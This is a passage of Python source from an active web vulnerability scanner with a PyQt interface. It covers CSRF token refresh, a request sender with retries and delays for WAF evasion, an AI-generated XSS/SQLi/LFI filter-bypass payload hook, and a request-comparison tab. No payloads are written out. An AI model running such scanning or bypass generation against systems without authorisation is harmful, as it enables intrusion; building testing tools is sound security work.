                        if cname in new_tokens:
                            new_parts.append(f"{cname}={new_tokens[cname]}")
                            replaced.add(cname)
                            continue
                    new_parts.append(part)
                headers[cookie_key] = "; ".join(new_parts)

            # ── Patch URL-encoded body ─────────────────────────────────────
            if body:
                try:
                    parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
                    changed = False
                    for n, v in new_tokens.items():
                        if n in parsed:
                            parsed[n] = [v]
                            changed = True
                    if changed:
                        body = urllib.parse.urlencode(parsed, doseq=True)
                except Exception:
                    pass

                # ── Patch JSON body ────────────────────────────────────────
                if body.lstrip().startswith("{"):
                    try:
                        import json as _json
                        jobj = _json.loads(body)
                        changed = False
                        for n, v in new_tokens.items():
                            if n in jobj:
                                jobj[n] = v
                                changed = True
                        if changed:
                            body = _json.dumps(jobj)
                    except Exception:
                        pass

            # ── Patch CSRF request headers (X-CSRF-Token etc.) ────────────
            _CSRF_HDR_NAMES = {"x-csrf-token", "x-xsrf-token", "csrf-token",
                               "x-csrf", "x-request-token"}
            for hk in list(headers.keys()):
                if hk.lower() in _CSRF_HDR_NAMES:
                    # Use the first scraped token value
                    headers[hk] = next(iter(new_tokens.values()))
                    break

            return headers, body

        except Exception as e:
            logger.debug(f"CSRF pre-flight error: {e}")
            return headers, body
        finally:
            self._csrf_preflight_active = False

    def send_request_with_traffic(self, url: str, headers: dict, method: str = 'GET',
                                    body: str = '', payload: str = '', payload_type: str = '',
                                    raw_url: bool = False, allow_redirects: bool = True,
                                    files: dict = None):
        """
        Send request and emit traffic entry - ALWAYS returns a response object.

        raw_url=True : bypass requests' URL encoder (needed for LFI).
        files        : dict passed directly to requests as `files=` for multipart
                       uploads.  When set, Content-Type / Content-Length are
                       managed by requests automatically — do NOT set them in headers.
        """
        import time

        # Respect scan config (with fallbacks for cases called before config is set)
        _timeout          = getattr(self, 'scan_timeout', 30)
        _verify_ssl       = getattr(self, 'scan_verify_ssl', False)
        _follow_redirects = getattr(self, 'scan_follow_redirects', True)
        _max_retries      = getattr(self, 'scan_max_retries', 1)
        _req_delay        = getattr(self, 'scan_req_delay', 0.0)

        # Inter-request delay (slow mode / WAF evasion)
        if _req_delay > 0:
            time.sleep(_req_delay)

        # ── CSRF token pre-flight refresh ─────────────────────────────────────
        # If a CSRF refresh URL was configured in the injection-point dialog,
        # GET it before every probe to pick up a fresh token, then patch it
        # into the headers / body we are about to send.  The flag prevents
        # recursion when the refresh request itself calls this method.
        headers, body = self._do_csrf_preflight(headers, body)
        # ─────────────────────────────────────────────────────────────────────

        STRIP_HEADERS = {'content-length', 'transfer-encoding'}
        # Also strip Content-Type when sending multipart so requests can set its
        # own boundary.
        if files:
            STRIP_HEADERS = STRIP_HEADERS | {'content-type'}
        headers = {k: v for k, v in headers.items()
                   if k.lower() not in STRIP_HEADERS}

        # Normalise Accept-Encoding: remove whatever case-variant the original
        # request used (e.g. "accept-encoding: gzip, deflate, br, zstd"), then
        # set a single canonical key with only the encodings _decode_response
        # can handle.  The case-insensitive removal prevents sending two
        # Accept-Encoding headers when the original already had one.
        headers = {k: v for k, v in headers.items() if k.lower() != 'accept-encoding'}
        headers['Accept-Encoding'] = 'gzip, deflate'

        traffic = TrafficEntry({
            'url': url,
            'method': method,
            'headers': headers,
            'body': body,
            'payload': payload,
            'payload_type': payload_type
        })

        last_error = None
        for attempt in range(max(1, _max_retries + 1)):
            try:
                start_time = time.time()
                session    = requests.Session()
                # Advertise the same encodings we put in headers so the session
                # default never overrides our per-request value.
                session.headers["Accept-Encoding"] = "gzip, deflate"

                # Helper: keep the Accept-Encoding header consistent on the
                # PreparedRequest object right before it goes on the wire.
                def _strip_ae(prep):
                    prep.headers["Accept-Encoding"] = "gzip, deflate"
                    return prep

                if raw_url:
                    req = requests.Request(
                        method  = method.upper(),
                        url     = url,
                        headers = headers,
                        data    = body if method.upper() != 'GET' else None,
                    )
                    prepped     = session.prepare_request(req)
                    prepped.url = url
                    resp_obj = session.send(
                        _strip_ae(prepped),
                        timeout         = _timeout,
                        allow_redirects = _follow_redirects and allow_redirects,
                        verify          = _verify_ssl,
                        stream          = True,
                    )
                elif files:
                    prep = requests.Request(
                        method  = "POST",
                        url     = url,
                        headers = headers,
                        files   = files,
                    ).prepare()

                    real_ct = prep.headers.get("Content-Type", "")
                    traffic.request_headers["content-type"] = real_ct

                    bm = re.search(r'boundary=([^\s;]+)', real_ct)
                    boundary = bm.group(1) if bm else "----boundary"
                    traffic.request_body = _build_multipart_preview(files, boundary)

                    resp_obj = session.send(
                        _strip_ae(prep),
                        timeout         = _timeout,
                        allow_redirects = _follow_redirects and allow_redirects,
                        verify          = _verify_ssl,
                        stream          = True,
                    )
                elif method.upper() == 'GET':
                    # Use prepare+send (not session.get) so _strip_ae can enforce
                    # the header on the final PreparedRequest before it goes on wire.
                    req = requests.Request(
                        method  = "GET",
                        url     = url,
                        headers = headers,
                    )
                    prepped = session.prepare_request(req)
                    resp_obj = session.send(
                        _strip_ae(prepped),
                        timeout         = _timeout,
                        allow_redirects = _follow_redirects and allow_redirects,
                        verify          = _verify_ssl,
                        stream          = True,
                    )
                else:
                    req = requests.Request(
                        method  = method.upper(),
                        url     = url,
                        headers = headers,
                        data    = body,
                    )
                    prepped = session.prepare_request(req)
                    resp_obj = session.send(
                        _strip_ae(prepped),
                        timeout         = _timeout,
                        allow_redirects = _follow_redirects and allow_redirects,
                        verify          = _verify_ssl,
                        stream          = True,
                    )

                # Decode gzip/deflate before anything else touches the response.
                resp_obj = self._decode_response(resp_obj)

                # Retry on 429 (rate limited) if retries remain
                if resp_obj.status_code == 429 and attempt < _max_retries:
                    retry_after = int(resp_obj.headers.get('Retry-After', max(2, _req_delay * 2 or 3)))
                    self.scan_progress.emit(
                        f"  ⚠  429 Rate Limited — waiting {retry_after}s before retry "
                        f"(attempt {attempt+1}/{_max_retries+1})"
                    )
                    time.sleep(retry_after)
                    last_error = f"429 Too Many Requests"
                    continue

                elapsed = time.time() - start_time
                traffic.set_response(resp_obj, elapsed)
                self.traffic_entry.emit(traffic)
                # ── Step-mode gate: pause after emitting traffic ─────────────────
                self._step_wait(payload or payload_type)
                # ─────────────────────────────────────────────────────────
                return resp_obj

            except Exception as e:
                last_error = str(e)
                if attempt < _max_retries:
                    wait = min(2 ** attempt, 8)  # exponential back-off: 1s, 2s, 4s, 8s
                    self.scan_progress.emit(
                        f"  ⚠  Request error ({e.__class__.__name__}) — "
                        f"retry {attempt+1}/{_max_retries} in {wait}s"
                    )
                    time.sleep(wait)
                    continue

        # All attempts exhausted
        elapsed = time.time() - start_time if 'start_time' in locals() else 0
        traffic.set_error(last_error or "Unknown error")
        self.traffic_entry.emit(traffic)

        error_resp = self.ErrorResponse(last_error or "Unknown error")
        error_resp.elapsed = elapsed
        error_resp.url = url
        return error_resp

    def _get_ai_bypass_payloads(
        self,
        param_name: str,
        current_value: str,
        response_snippet: str,
        waf_fingerprint: str,
        scan_type: str = "XSS",
    ) -> List[str]:
        """
        Call the configured AI provider to generate targeted bypass payloads.

        Inputs come from the probe phase of the active scan:
          param_name       — the injection point being tested
          current_value    — the parameter's original/baseline value
          response_snippet — first chunk of the last probe response body
          waf_fingerprint  — human-readable filter/WAF description (e.g. from
                             XSS FilterModel.summarise() or SQLi baseline headers)
          scan_type        — "XSS", "SQLi", "LFI", etc.

        Returns a list of payload strings to prepend to the attack phase.
        Returns an empty list when AI is disabled, unconfigured, or on error.
        """
        if not getattr(self, 'ai_suggest_payloads', False):
            return []
        if not self.ai_settings:
            return []
        try:
            from modules.ai_client import suggest_bypass_payloads
            self.scan_progress.emit(
                f"  ✨ AI Payload Suggester: analysing probe response for '{param_name}' "
                f"[{scan_type}] (filter: {waf_fingerprint or 'none'}) …"
            )
            payloads = suggest_bypass_payloads(
                self.ai_settings,
                param_name       = param_name,
                current_value    = current_value,
                response_snippet = response_snippet,
                waf_fingerprint  = waf_fingerprint,
                scan_type        = scan_type,
            )
            if payloads:
                self.scan_progress.emit(
                    f"  ✨ AI Payload Suggester: {len(payloads)} targeted payload(s) generated"
                )
            else:
                self.scan_progress.emit(
                    "  ✨ AI Payload Suggester: no payloads returned (check AI config)"
                )
            return payloads
        except Exception as exc:
            self.scan_progress.emit(f"  ⚠  AI Payload Suggester error: {exc}")
            return []

    # ============================================================================
    # XSS SCANNING
    # ============================================================================

    def stop(self):
        """Stop the scan"""
        self.running = False
        # Unblock any thread waiting on a step gate or CSRF ready event
        self._step_event.set()
        self._csrf_option_c_ready.set()
        # Shut down thread-pool executor used by Boost Mode (if active)
        if self.executor is not None:
            self.executor.shutdown(wait=False)
            self.executor = None


# =============================================================================
# RESEND WORKER
# =============================================================================

class ResendWorker(QThread):
    """
    Fires a single stored HTTP request exactly as-is and emits the result.
    Used by the Compare tab to re-execute either the baseline or the payload
    request so the user can verify findings are reproducible.
    """
    finished  = pyqtSignal(object)   # TrafficEntry with fresh response
    error     = pyqtSignal(str)

    def __init__(self, traffic_entry: 'TrafficEntry'):
        super().__init__()
        self._entry = traffic_entry

    def run(self):
        import time as _time
        entry = self._entry
        new_entry = TrafficEntry({
            'url':          entry.url,
            'method':       entry.method,
            'headers':      entry.request_headers,
            'body':         entry.request_body,
            'payload':      entry.payload,
            'payload_type': f"{entry.payload_type} (Resend)" if entry.payload_type else "Resend",
        })
        try:
            session = requests.Session()
            start = _time.time()
            
            # Prepare headers - strip Host and Content-Length to let requests handle them
            headers = {
                k: v for k, v in entry.request_headers.items()
                if k.lower() not in ('host', 'content-length')
            }
            
            # Use generic request method to support all HTTP verbs (GET, POST, PUT, DELETE, etc.)
            resp = session.request(
                method=entry.method.upper(),
                url=entry.url,
                headers=headers,
                data=entry.request_body,
                timeout=30,
                allow_redirects=True,
                verify=False,
            )
            
            elapsed = _time.time() - start
            new_entry.set_response(resp, elapsed)
            self.finished.emit(new_entry)
        except Exception as exc:
            new_entry.set_error(str(exc))
            # Emit finished even on error so it shows in the table/compare view
            self.finished.emit(new_entry)
            self.error.emit(str(exc))



class CompareTab(QWidget):
    """
    Side-by-side comparison of two TrafficEntry objects (typically a baseline
    and a payload request).  Shows:
      • Stats table  — status / length / time delta at a glance
      • Request diff — left vs right headers + body, changes highlighted
      • Response diff — left vs right body, added/removed lines coloured
      • Resend buttons — re-fire either request live and update the panel
    """

    # Colours used for inline diff highlighting
    COLOUR_ADDED   = "#1e4620"   # dark green  – lines only in right
    COLOUR_REMOVED = "#4a1010"   # dark red    – lines only in left
    COLOUR_CHANGED = "#3a3000"   # dark amber  – lines present in both but different
    COLOUR_LABEL_ADDED   = "#4caf50"
    COLOUR_LABEL_REMOVED = "#f44336"
    COLOUR_LABEL_CHANGED = "#ff9800"

    def __init__(self, parent=None):
        super().__init__(parent)
        self._left_entry:  Optional[TrafficEntry] = None
        self._right_entry: Optional[TrafficEntry] = None
        self._left_worker:  Optional[ResendWorker] = None
        self._right_worker: Optional[ResendWorker] = None
        self._init_ui()

    # ------------------------------------------------------------------
    # UI construction
    # ------------------------------------------------------------------

    def _init_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(8, 8, 8, 8)
        root.setSpacing(6)

        # ── Top header: LEFT slot info | RIGHT slot info ─────────────────
        header_row = QHBoxLayout()
        header_row.setSpacing(8)

        # LEFT slot header box
        left_box = QGroupBox("⬅  LEFT  (Baseline / Request A)")
        left_box.setFont(QFont("Segoe UI", 9, QFont.Bold))
        left_inner = QVBoxLayout(left_box)
        left_inner.setContentsMargins(6, 4, 6, 4)
        left_inner.setSpacing(4)

        self._left_label = QLabel("(empty — right-click a Traffic entry → Set as LEFT)")
        self._left_label.setWordWrap(True)
        self._left_label.setStyleSheet("color: #aaa; font-style: italic;")
        left_inner.addWidget(self._left_label)

        left_btn_row = QHBoxLayout()
        left_btn_row.setSpacing(6)

        self._left_resend_btn = QPushButton("⭮ Resend")
        self._left_resend_btn.setEnabled(False)
        self._left_resend_btn.setMaximumWidth(90)
        self._left_resend_btn.clicked.connect(self._resend_left)

        self._left_clear_btn = QPushButton("✕ Clear")
        self._left_clear_btn.setEnabled(False)
        self._left_clear_btn.setMaximumWidth(75)
        self._left_clear_btn.setStyleSheet(
            "QPushButton { background-color: #5a2020; color: #f88; }"
            "QPushButton:hover { background-color: #7a2020; }"
            "QPushButton:disabled { background-color: #333; color: #555; }"
        )
        self._left_clear_btn.clicked.connect(self._clear_left)

        self._left_status_lbl = QLabel("")
        self._left_status_lbl.setStyleSheet("color: #aaa; font-size: 8pt;")

        left_btn_row.addWidget(self._left_resend_btn)
        left_btn_row.addWidget(self._left_clear_btn)
        left_btn_row.addWidget(self._left_status_lbl)
        left_btn_row.addStretch()
        left_inner.addLayout(left_btn_row)
        header_row.addWidget(left_box)

        # RIGHT slot header box
        right_box = QGroupBox("➡  RIGHT  (Payload / Request B)")
        right_box.setFont(QFont("Segoe UI", 9, QFont.Bold))
        right_inner = QVBoxLayout(right_box)
        right_inner.setContentsMargins(6, 4, 6, 4)
        right_inner.setSpacing(4)

        self._right_label = QLabel("(empty — right-click a Traffic entry → Set as RIGHT)")
        self._right_label.setWordWrap(True)
        self._right_label.setStyleSheet("color: #aaa; font-style: italic;")
        right_inner.addWidget(self._right_label)

        right_btn_row = QHBoxLayout()
        right_btn_row.setSpacing(6)

        self._right_resend_btn = QPushButton("⭮ Resend")
        self._right_resend_btn.setEnabled(False)
        self._right_resend_btn.setMaximumWidth(90)
        self._right_resend_btn.clicked.connect(self._resend_right)

        self._right_clear_btn = QPushButton("✕ Clear")
        self._right_clear_btn.setEnabled(False)
        self._right_clear_btn.setMaximumWidth(75)
        self._right_clear_btn.setStyleSheet(
            "QPushButton { background-color: #5a2020; color: #f88; }"
            "QPushButton:hover { background-color: #7a2020; }"
            "QPushButton:disabled { background-color: #333; color: #555; }"
        )
        self._right_clear_btn.clicked.connect(self._clear_right)

        self._right_status_lbl = QLabel("")
        self._right_status_lbl.setStyleSheet("color: #aaa; font-size: 8pt;")

        right_btn_row.addWidget(self._right_resend_btn)
        right_btn_row.addWidget(self._right_clear_btn)
        right_btn_row.addWidget(self._right_status_lbl)
        right_btn_row.addStretch()
        right_inner.addLayout(right_btn_row)
        header_row.addWidget(right_box)

        root.addLayout(header_row)

        self._stats_table = QTableWidget(3, 3)
        self._stats_table.setHorizontalHeaderLabels(["Metric", "Left", "Right  (Δ)"])
        self._stats_table.verticalHeader().setVisible(False)
        self._stats_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self._stats_table.setSelectionMode(QTableWidget.NoSelection)
        self._stats_table.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self._stats_table.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self._stats_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents)
        self._stats_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self._stats_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        # Fix height: header (~24px) + 3 rows × 22px = 90px, no scroll
        self._stats_table.horizontalHeader().setFixedHeight(24)
        for r in range(3):
            self._stats_table.setRowHeight(r, 22)
        self._stats_table.setFixedHeight(24 + 3 * 22)   # 90px exact
        self._stats_table.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        root.addWidget(self._stats_table)
        self._clear_stats()

        # ── Main splitter: LEFT column | RIGHT column ────────────────────
        #
        #   LEFT column                RIGHT column
        #   ┌──────────────────┐       ┌──────────────────┐
        #   │  🠉 Request (A)  │       │  🠉 Request (B)  │
        #   ├──────────────────┤       ├──────────────────┤
        #   │  🠋 Response (A) │       │  🠋 Response (B) │
        #   └──────────────────┘       └──────────────────┘
        #
        main_split = QSplitter(Qt.Horizontal)
        main_split.setHandleWidth(6)
        main_split.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)

        # ── LEFT column ──────────────────────────────────────────────────
        left_col = QWidget()
        left_col_layout = QVBoxLayout(left_col)
        left_col_layout.setContentsMargins(0, 0, 3, 0)
        left_col_layout.setSpacing(0)

        left_col_split = QSplitter(Qt.Vertical)
        left_col_split.setHandleWidth(5)

        # Left Request
        self._left_req_text = self._make_diff_editor()
        left_col_split.addWidget(
            self._wrap_pane("🠉  Request  —  LEFT (Baseline / A)", self._left_req_text,
                            label_colour="#5b8dd9")
        )

        # Left Response
        self._left_resp_text = self._make_diff_editor()
        left_col_split.addWidget(
            self._wrap_pane("🠋  Response  —  LEFT (Baseline / A)", self._left_resp_text,
                            label_colour="#5b8dd9")
        )

        left_col_split.setSizes([300, 300])
        left_col_layout.addWidget(left_col_split)
        main_split.addWidget(left_col)

        # ── RIGHT column ─────────────────────────────────────────────────
        right_col = QWidget()
        right_col_layout = QVBoxLayout(right_col)
        right_col_layout.setContentsMargins(3, 0, 0, 0)
        right_col_layout.setSpacing(0)

        right_col_split = QSplitter(Qt.Vertical)
        right_col_split.setHandleWidth(5)

        # Right Request
        self._right_req_text = self._make_diff_editor()
        right_col_split.addWidget(
            self._wrap_pane("🠉  Request  —  RIGHT (Payload / B)", self._right_req_text,
                            label_colour="#d98b5b")
        )

        # Right Response
        self._right_resp_text = self._make_diff_editor()
        right_col_split.addWidget(
            self._wrap_pane("🠋  Response  —  RIGHT (Payload / B)", self._right_resp_text,
                            label_colour="#d98b5b")
        )

        right_col_split.setSizes([300, 300])
        right_col_layout.addWidget(right_col_split)
        main_split.addWidget(right_col)

        main_split.setSizes([500, 500])
        root.addWidget(main_split, stretch=1)   # ← takes all remaining vertical space

        # ── Legend — single compact line at the very bottom ──────────────
        legend = QLabel(
            f"<span style='color:{self.COLOUR_LABEL_ADDED}'>■ Added</span>"
            f"&nbsp;&nbsp;"
            f"<span style='color:{self.COLOUR_LABEL_REMOVED}'>■ Removed</span>"
            f"&nbsp;&nbsp;"
            f"<span style='color:{self.COLOUR_LABEL_CHANGED}'>■ Changed</span>"
        )
        legend.setStyleSheet("font-size: 8pt; padding: 2px 4px;")
        root.addWidget(legend)


    # ------------------------------------------------------------------
    # Public API — called from ScannerTab
    # ------------------------------------------------------------------

    def load_left(self, entry: 'TrafficEntry'):
        """Load a TrafficEntry into the LEFT slot."""
        self._left_entry = entry
        self._left_label.setText(self._entry_summary(entry))
        self._left_label.setStyleSheet("color: #ddd;")
        self._left_resend_btn.setEnabled(True)
        self._left_clear_btn.setEnabled(True)
        self._refresh_diff()

    def load_right(self, entry: 'TrafficEntry'):
        """Load a TrafficEntry into the RIGHT slot."""
        self._right_entry = entry
        self._right_label.setText(self._entry_summary(entry))
        self._right_label.setStyleSheet("color: #ddd;")
        self._right_resend_btn.setEnabled(True)
        self._right_clear_btn.setEnabled(True)
        self._refresh_diff()

    # ------------------------------------------------------------------
    # Resend
    # ------------------------------------------------------------------

    def _resend_left(self):
        if not self._left_entry:
            return
        self._left_status_lbl.setText("⏳ Resending…")
        self._left_resend_btn.setEnabled(False)
        self._left_worker = ResendWorker(self._left_entry)
        self._left_worker.finished.connect(self._on_left_resend_done)
        self._left_worker.error.connect(lambda e: self._on_resend_error("left", e))
        self._left_worker.start()

    def _resend_right(self):
        if not self._right_entry:
            return
        self._right_status_lbl.setText("⏳ Resending…")
        self._right_resend_btn.setEnabled(False)
        self._right_worker = ResendWorker(self._right_entry)
        self._right_worker.finished.connect(self._on_right_resend_done)
        self._right_worker.error.connect(lambda e: self._on_resend_error("right", e))
        self._right_worker.start()

    def _on_left_resend_done(self, new_entry: 'TrafficEntry'):
        self._left_entry = new_entry
        self._left_label.setText("⭮ " + self._entry_summary(new_entry))
        self._left_status_lbl.setText(
            f"✓ {new_entry.status_code}  {new_entry.content_length}b  {new_entry.response_time}s"
        )
        self._left_resend_btn.setEnabled(True)
        self._left_clear_btn.setEnabled(True)
        self._refresh_diff()

    def _on_right_resend_done(self, new_entry: 'TrafficEntry'):
        self._right_entry = new_entry
        self._right_label.setText("⭮ " + self._entry_summary(new_entry))
        self._right_status_lbl.setText(
            f"✓ {new_entry.status_code}  {new_entry.content_length}b  {new_entry.response_time}s"
        )
        self._right_resend_btn.setEnabled(True)
        self._right_clear_btn.setEnabled(True)
        self._refresh_diff()

    def _on_resend_error(self, side: str, error: str):
        if side == "left":
            self._left_status_lbl.setText(f"✗ {error[:60]}")
            self._left_resend_btn.setEnabled(True)
        else:
            self._right_status_lbl.setText(f"✗ {error[:60]}")
            self._right_resend_btn.setEnabled(True)

    def _clear_left(self):
        """Clear the LEFT slot and reset all left-side panels."""
        self._left_entry = None
        self._left_label.setText("(empty — right-click a Traffic entry → Set as LEFT)")
        self._left_label.setStyleSheet("color: #aaa; font-style: italic;")
        self._left_status_lbl.setText("")
        self._left_resend_btn.setEnabled(False)
        self._left_clear_btn.setEnabled(False)
        self._refresh_diff()

    def _clear_right(self):
        """Clear the RIGHT slot and reset all right-side panels."""
        self._right_entry = None
        self._right_label.setText("(empty — right-click a Traffic entry → Set as RIGHT)")
        self._right_label.setStyleSheet("color: #aaa; font-style: italic;")
        self._right_status_lbl.setText("")
        self._right_resend_btn.setEnabled(False)
        self._right_clear_btn.setEnabled(False)
        self._refresh_diff()

    # ------------------------------------------------------------------
    # Diff rendering
    # ------------------------------------------------------------------

    def _refresh_diff(self):
        """Rebuild all diff panels whenever either slot is updated."""
        L = self._left_entry
        R = self._right_entry

        # Stats table
        self._render_stats(L, R)

        # Request diff
        left_req_str  = _format_request(L) if L else ""
        right_req_str = _format_request(R) if R else ""
        self._render_diff(self._left_req_text,  self._right_req_text,
                          left_req_str, right_req_str)

        # Response diff
        left_resp_str  = _format_response(L) if L else ""
        right_resp_str = _format_response(R) if R else ""
        self._render_diff(self._left_resp_text, self._right_resp_text,
                          left_resp_str, right_resp_str)

    def _render_stats(self, L: Optional['TrafficEntry'], R: Optional['TrafficEntry']):
        """Populate the 3-row stats table with deltas."""
        rows = [
            ("HTTP Status",
             str(L.status_code)  if L else "—",
             str(R.status_code)  if R else "—",
             L.status_code if L else None,
             R.status_code if R else None),
            ("Content Length",
             f"{L.content_length} b" if L else "—",
             f"{R.content_length} b" if R else "—",
             L.content_length if L else None,
             R.content_length if R else None),
            ("Response Time",
             f"{L.response_time} s" if L else "—",
             f"{R.response_time} s" if R else "—",
             L.response_time if L else None,
             R.response_time if R else None),
        ]

        metric_names  = ["HTTP Status", "Content Length (b)", "Response Time (s)"]
        for row_idx, (metric, lval, rval, lnum, rnum) in enumerate(rows):
            self._stats_table.setItem(row_idx, 0, QTableWidgetItem(metric_names[row_idx]))
            self._stats_table.setItem(row_idx, 1, QTableWidgetItem(lval))

            # Build right cell with delta
            delta_str = ""
            colour    = None
            if lnum is not None and rnum is not None:
                try:
                    diff = float(rnum) - float(lnum)
                    sign = "+" if diff >= 0 else ""
                    if metric_names[row_idx] == "HTTP Status":
                        delta_str = f"{rval}"
                        if lnum != rnum:
                            delta_str += f"  (Δ {sign}{int(diff)})"
                            colour = self.COLOUR_LABEL_CHANGED
                    elif metric_names[row_idx] == "Content Length (b)":
                        delta_str = f"{rval}  (Δ {sign}{int(diff)} b)"
                        if diff > 0:
                            colour = self.COLOUR_LABEL_ADDED
                        elif diff < 0:
                            colour = self.COLOUR_LABEL_REMOVED
                    else:
                        delta_str = f"{rval}  (Δ {sign}{diff:.3f} s)"
                        if abs(diff) > 1.0:
                            colour = self.COLOUR_LABEL_CHANGED
                except Exception:
                    delta_str = rval
            else:
                delta_str = rval

            r_item = QTableWidgetItem(delta_str)
            if colour:
                r_item.setForeground(QBrush(QColor(colour)))
                font = r_item.font()
                font.setBold(True)
                r_item.setFont(font)
            self._stats_table.setItem(row_idx, 2, r_item)

    def _render_diff(self, left_editor: QTextEdit, right_editor: QTextEdit,
                     left_text: str, right_text: str):
        """
        Line-by-line diff.  Lines unique to the left are highlighted red in
        the left pane; lines unique to the right are highlighted green in the
        right pane; lines that exist in both but at different positions are
        amber in both panes.
        Both editors are written simultaneously so vertical scroll positions
        stay in sync.
        """
        import difflib

        left_lines  = left_text.splitlines()
        right_lines = right_text.splitlines()

        sm = difflib.SequenceMatcher(None, left_lines, right_lines, autojunk=False)
        opcodes = sm.get_opcodes()

        left_editor.clear()
        right_editor.clear()

        left_cursor  = left_editor.textCursor()
        right_cursor = right_editor.textCursor()

        def _append(cursor: QTextCursor, text: str, bg_hex: Optional[str]):
            fmt = QTextCharFormat()
            if bg_hex:
                fmt.setBackground(QBrush(QColor(bg_hex)))
            else:
                fmt.setBackground(QBrush(Qt.transparent))
            cursor.movePosition(QTextCursor.End)
            cursor.insertText(text + "\n", fmt)

        for tag, i1, i2, j1, j2 in opcodes:
            if tag == 'equal':
                for line in left_lines[i1:i2]:
                    _append(left_cursor,  line, None)
                    _append(right_cursor, line, None)

            elif tag == 'replace':
                # Pad shorter side with blank lines so panes stay aligned
                l_block = left_lines[i1:i2]
                r_block = right_lines[j1:j2]
                max_len = max(len(l_block), len(r_block))
                l_block += [""] * (max_len - len(l_block))
                r_block += [""] * (max_len - len(r_block))
                for ll, rl in zip(l_block, r_block):
                    _append(left_cursor,  ll, self.COLOUR_CHANGED)
                    _append(right_cursor, rl, self.COLOUR_CHANGED)

            elif tag == 'delete':
                for line in left_lines[i1:i2]:
                    _append(left_cursor,  line, self.COLOUR_REMOVED)
                    _append(right_cursor, "",   self.COLOUR_REMOVED)

            elif tag == 'insert':
                for line in right_lines[j1:j2]:
                    _append(left_cursor,  "",   self.COLOUR_ADDED)
                    _append(right_cursor, line, self.COLOUR_ADDED)

    # ------------------------------------------------------------------
    # Helpers — format_request / format_response are module-level functions
    # defined at the top of this file so both CompareTab and ScannerTab
    # can share them without duplication.

    @staticmethod
    def _entry_summary(entry: 'TrafficEntry') -> str:
        ts = entry.timestamp.strftime("%H:%M:%S")
        status = entry.status_code or "ERR"
        length = f"{entry.content_length}b" if entry.content_length is not None else "?"
        t      = f"{entry.response_time}s"  if entry.response_time  is not None else "?"
        short_url = entry.url if len(entry.url) <= 90 else entry.url[:87] + "…"
        payload_info = f"  │  payload: {entry.payload[:40]}" if entry.payload else ""
        return f"[{ts}]  {entry.method}  {short_url}  │  {status}  {length}  {t}{payload_info}"

    def _clear_stats(self):
        for r in range(3):
            for c in range(3):
                self._stats_table.setItem(r, c, QTableWidgetItem("—"))
        for r, name in enumerate(["HTTP Status", "Content Length (b)", "Response Time (s)"]):
            self._stats_table.setItem(r, 0, QTableWidgetItem(name))

    @staticmethod
    def _make_diff_editor() -> QTextEdit:
        ed = QTextEdit()
        ed.setReadOnly(True)
        ed.setFont(QFont("Consolas", 8))
        ed.setLineWrapMode(QTextEdit.NoWrap)
        return ed

    @staticmethod
    def _wrap_pane(title: str, editor: QTextEdit,
                   label_colour: str = "#888") -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(2)
        lbl = QLabel(title)
        lbl.setStyleSheet(
            f"color: {label_colour}; font-size: 8pt; font-weight: bold; "
            f"padding: 2px 4px; border-bottom: 1px solid #333;"
        )
        lay.addWidget(lbl)
        lay.addWidget(editor)
        return w


# =============================================================================
# SCANNER TAB
# =============================================================================

class ScannerTab(QWidget):
    """Scanner tab for active vulnerability scanning with traffic monitoring"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.parent = parent
        self.current_scan_worker = None
        self.scan_queue = []
        self.scan_results = {}
        self.scan_logs = {}
        self.traffic_entries = []
        self.current_filtered_url = None
        self.additional_filtered_urls = []
        self.compare_tab: Optional[CompareTab] = None   # created in init_ui
        # Baseline tracking — updated whenever a *-Baseline payload_type arrives.
        # Used to compute ΔLen and flag time anomalies in the traffic table.
        self._baseline_length: Optional[int]  = None
        self._baseline_time:   Optional[float] = None

        # ── Scan Configuration (set via ⚙ dialog, consumed by start_scan / ScanWorker) ──
        # Speed preset:  "fast" | "normal" | "slow"
        self._scan_speed_preset    = "normal"
        # Request timeout (seconds)
        self._scan_timeout         = 30
        # Inter-request delay (seconds, applied between sequential payloads)
        self._scan_req_delay       = 0.0
        # Max parallel workers for boost-mode pool
        self._scan_max_workers     = 8
        # Max retries on connection error / 429
        self._scan_max_retries     = 1
        # Follow redirects
        self._scan_follow_redirects = True
        # Verify SSL
        self._scan_verify_ssl      = False
        # Stop on first finding per injection point
        self._scan_stop_on_first   = False
        # Boolean-based consensus threshold (min agreeing pairs)
        self._scan_bool_consensus  = 2
        # Time-based delay threshold (seconds above baseline to flag)
        self._scan_time_threshold  = 1.5
        # One-by-one step mode — send one request then pause until user clicks Next
        self._scan_step_mode       = False

        self.init_ui()
    
    def init_ui(self):
        """Initialize the UI"""
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        # Top toolbar
        toolbar = self.create_toolbar()
        layout.addWidget(toolbar)

        # Main horizontal splitter: queue (left) | content tabs (right)
        # Keeping the queue always visible while browsing results / traffic.
        main_splitter = QSplitter(Qt.Horizontal)
        main_splitter.setChildrenCollapsible(False)

        # Scan queue (left panel)
        queue_widget = self.create_queue_widget()
        main_splitter.addWidget(queue_widget)

        # Tab widget (right panel)
        self.content_tabs = QTabWidget()
        self.content_tabs.setTabPosition(QTabWidget.North)

        # Results tab
        self.results_widget = self.create_results_tab()
        self.content_tabs.addTab(self.results_widget, "🗠 Results")

        # Request Logs tab
        self.logs_widget = self.create_logs_tab()
        self.content_tabs.addTab(self.logs_widget, " Request Logs")

        # Traffic tab
        self.traffic_widget = self.create_traffic_tab()
        self.content_tabs.addTab(self.traffic_widget, " Traffic")

        # Compare tab
        self.compare_tab = CompareTab(self)
        self.compare_tab.setStyleSheet(self._compare_tab_style())
        self.content_tabs.addTab(self.compare_tab, " Compare")

        main_splitter.addWidget(self.content_tabs)
        main_splitter.setSizes([260, 940])
        main_splitter.setStretchFactor(0, 0)
